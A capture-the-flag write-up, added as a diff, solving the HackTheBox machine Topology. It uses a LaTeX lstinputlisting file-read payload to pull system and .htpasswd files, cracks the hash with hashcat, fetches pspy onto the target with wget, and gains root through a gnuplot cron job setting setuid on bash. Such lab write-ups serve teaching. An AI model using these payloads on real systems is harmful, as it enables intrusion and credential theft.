@@ -1,0 +1,249 @@
+---
+title: "Topology"
+description: "HackTheBox Topology: a LaTeX equation generator's lstinputlisting becomes local file inclusion, an .htpasswd hash cracks to SSH access, and a gnuplot cron job gives root through a .plt file."
+date: "2026-11-25"
+difficulty: "Medium"
+published: true
+---
+
+# Topology
+
+[Machine link](https://app.hackthebox.com/machines/Topology)
+
+> A Linux machine running a web application susceptible to Local File Inclusion (LFI).
+
+---
+
+## Machine Information
+
+| | |
+|---|---|
+| **Name** | Topology |
+| **Platform** | Hack The Box |
+| **Difficulty** | Medium |
+| **OS** | Linux (Ubuntu 20.04.6 LTS) |
+| **Attack vector** | LaTeX `\lstinputlisting` LFI, cracked `.htpasswd` hash, gnuplot `.plt` cron job |
+
+---
+
+## Task 1: Apache version
+
+```bash
+nmap -sC -sV 10.129.92.20
+```
+
+![Nmap scan showing SSH and HTTP with Apache 2.4.41](/images/writeups/hackthebox/topology-nmap.png)
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+```
+
+**Answer:** `2.4.41`
+
+---
+
+## Task 2: The LaTeX subdomain
+
+The main website references an interactive application under `latex.topology.htb`:
+
+![Miskatonic University site with the LaTeX Equation Generator link](/images/writeups/hackthebox/topology-main-site.png)
+
+**Answer:** `latex.topology.htb`
+
+---
+
+## Task 3: The LaTeX package
+
+Add the IP, the domain and the subdomain to `/etc/hosts`:
+
+![/etc/hosts updated with topology.htb and latex.topology.htb](/images/writeups/hackthebox/topology-hosts.png)
+
+We can now visit the latex subdomain. The hint tells us there's a web root for `latex.topology.htb`, so let's visit it:
+
+![Directory index on latex.topology.htb](/images/writeups/hackthebox/topology-index.png)
+
+Opening `header.tex` gives the answer:
+
+![header.tex listing the LaTeX packages](/images/writeups/hackthebox/topology-header-tex.png)
+
+**Answer:** `listings`
+
+The `\usepackage{listings}` line is the one that matters. That package can include the contents of arbitrary files through `\lstinputlisting`.
+
+---
+
+## Task 4: Inline math mode
+
+**Answer:** `$`
+
+Wrapping a LaTeX command between dollar signs puts it into inline math mode, and the application renders the result as an image.
+
+---
+
+## Task 5: The Apache configuration file
+
+Test `$\lstinputlisting{/etc/passwd}$` on the latex site:
+
+![The passwd file rendered through lstinputlisting](/images/writeups/hackthebox/topology-passwd-lfi.png)
+
+It prints the passwd file, which confirms arbitrary file read. Now try the standard Apache2 config path, `/etc/apache2/sites-enabled/000-default.conf`:
+
+![Apache virtual host configuration rendered through the LFI](/images/writeups/hackthebox/topology-apache-config.png)
+
+**Answer:** `/etc/apache2/sites-enabled/000-default.conf`
+
+---
+
+## Task 6: The dev web root
+
+Studying the virtual host file shows the `ServerName` and `DocumentRoot` for the dev host:
+
+![dev.topology.htb virtual host with DocumentRoot /var/www/dev](/images/writeups/hackthebox/topology-dev-vhost.png)
+
+**Answer:** `/var/www/dev`
+
+---
+
+## Task 7: Directory-level access configuration
+
+**Answer:** `.htaccess`
+
+---
+
+## Task 8: vdaisley's password
+
+We know the username and the web root path, so we read the password file from there with `$\lstinputlisting{/var/www/dev/.htpasswd}$`:
+
+![The .htpasswd hash rendered by the LFI](/images/writeups/hackthebox/topology-htpasswd.png)
+
+The password is a hash. Use Google Lens to convert the image to text, then put the hash in a file and crack it with hashcat:
+
+```bash
+vim dev.hash
+sudo hashcat dev.hash --username /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+![Hashcat cracking the hash to the masked password](/images/writeups/hackthebox/topology-hashcat.png)
+
+The hash `$apr1$10NUB/S2$58eeNVirnRDB5zAIbTxTY0` cracks to a password masked here as `calc…us20`.
+
+**Answer:** `calc…us20`
+
+---
+
+## User Flag
+
+SSH into `vdaisley@10.129.92.20` with the recovered password:
+
+![SSH login as vdaisley](/images/writeups/hackthebox/topology-ssh-login.png)
+
+```text
+vdaisley@topology:~$ ls
+user.txt
+vdaisley@topology:~$ cat user.txt
+9421…768a
+```
+
+---
+
+## Task 10: The root cron script
+
+`ps aux` and `grep` for cron showed nothing, so I used [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64), an unprivileged Linux process snooping tool. Download it, serve it from a Python HTTP server and fetch it on the target:
+
+```bash
+chmod +x pspy64
+python3 -m http.server
+```
+
+```bash
+vdaisley@topology:~$ wget http://10.10.14.173:8000/pspy64
+vdaisley@topology:~$ chmod +x pspy64
+vdaisley@topology:~$ ./pspy64
+```
+
+![pspy starting up](/images/writeups/hackthebox/topology-pspy-banner.png)
+
+Give it a few seconds and it finds the running processes:
+
+![pspy output showing the gnuplot cron job](/images/writeups/hackthebox/topology-pspy-processes.png)
+
+The root-owned cron runs `/opt/gnuplot/getdata.sh` every minute.
+
+**Answer:** `/opt/gnuplot/getdata.sh`
+
+---
+
+## Task 11: The root binary
+
+**Answer:** `gnuplot`
+
+The script invokes gnuplot, which runs as root.
+
+---
+
+## Task 12: The cron directory
+
+**Answer:** `/opt/gnuplot`
+
+The cron looks in this directory for `.plt` files and passes each one to gnuplot.
+
+---
+
+## Task 13: Command execution in gnuplot
+
+The gnuplot manual documents the `system` command, which executes shell commands.
+
+**Answer:** `system`
+
+---
+
+## Root Flag
+
+Change into the directory and list it:
+
+```text
+vdaisley@topology:~$ cd /opt/gnuplot/
+vdaisley@topology:/opt/gnuplot$ ls
+ls: cannot open directory '.': Permission denied
+```
+
+Creating a file works, so we have write permission but no read permission:
+
+```text
+vdaisley@topology:/opt/gnuplot$ touch test
+```
+
+Create a `.plt` file that gives the bash binary the setuid bit, then wait for the cron job to run it:
+
+```text
+vdaisley@topology:/opt/gnuplot$ echo 'system "chmod u+s /bin/bash"' > exploit.plt
+```
+
+After a minute, use the privileged shell:
+
+```text
+vdaisley@topology:/opt/gnuplot$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+bea6…7668
+```
+
+<div className="max-w-[420px] mx-auto">
+
+![You have solved Topology](/images/writeups/hackthebox/topology-solved.png)
+
+</div>
+
+---
+
+## Lessons Learned
+
+- **LaTeX can be a file-read primitive.** `\lstinputlisting` is a legitimate package feature, so the LFI lived in how the application rendered user-supplied equations rather than in a classic PHP include bug.
+- **Virtual host config files are a roadmap.** Once `/etc/apache2/sites-enabled/000-default.conf` was readable, it revealed the dev host's `DocumentRoot`, which pointed directly at the `.htpasswd` file.
+- **Image-rendered secrets still need OCR.** The hash was displayed as an image, and Google Lens turned it into text that hashcat could consume.
+- **pspy sees what an unprivileged user cannot.** Cron jobs run as root are invisible in a normal `ps aux`; process snooping exposed the every-minute gnuplot script in seconds.
+- **Write permission without read permission is enough.** The `/opt/gnuplot` directory could not be listed, but a crafted `.plt` file was executed by root on the next cron tick. A single `system "chmod u+s /bin/bash"` turned that into a root shell.
